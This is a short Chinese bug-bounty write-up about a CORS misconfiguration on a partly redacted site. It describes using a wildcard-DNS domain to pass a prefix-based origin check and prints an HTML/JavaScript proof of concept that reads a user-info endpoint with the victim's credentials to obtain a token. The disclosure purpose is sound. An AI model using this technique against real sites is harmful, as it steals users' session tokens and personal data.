---
title: CORS漏洞配置错误
slug: 0009
---
# CORS漏洞配置错误

**CORS 跨域资源共享，就是可以让不同网站和不同服务器直接通信。**



**某团的给的一个中危**

**挖洞过程无意中看到一个数据包，响应包中包含有Access-Control-Allow-Origin这个字段，然后就随手尝试看看有没有CORS漏洞！结果如图**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779962057085-4cbc5014-a9d4-4d8d-b489-edf703e7d6fc.png)**

**再尝试 发现  如下图！**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779962056889-df5a73c8-d036-4b6f-951a-cac47add80d8.png)**

**发现后面再加上域名是可以跨域获取资源的**

**如何利用？**

**利用方式就是泛解析，将http://m..com.rcoil.me解析到我们的IP上，由于比较穷买不起域名，就本地搭了个DNS设置了泛解析，如下图**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779962055844-b280430a-b814-4e95-8220-9ee311a18f19.png)**

**只要是*.rcoil.me都会解析到我们的本地这**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779962056303-2d1b5244-d75f-45d6-a2ef-f7c40b86e191.png)**

**POC**如下：****

**<!DOCTYPE html>**

**<html>**

**<body>**

**<center>**

**<h2>CORS POC Exploit</h2>**

**<h3>Extract SID</h3>**



<div id="demo">

**<button type="button" onclick="cors()">Exploit</button>**

**</div>**



<script>

**function cors() {**

**var xhttp = new XMLHttpRequest();**

**xhttp.onreadystatechange = function() {**

**if (this.readyState == 4 && this.status == 200) {**

**document.getElementById("demo").innerHTML = alert(this.responseText);**

**}**

**};**

**xhttp.open("GET", "http://m.\**\*.com/activity/juejiapi/editor/userinfo", true);**

**xhttp.withCredentials = true;**

**xhttp.send();**

**}**

**</script>**



**</body>**

**</html>**

**而拿到的TOKEN又能干嘛呢，如图**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779962056840-9147e05c-f3b2-4d5e-a6d9-6e9c9d2fe9a6.png)**

**美滋滋**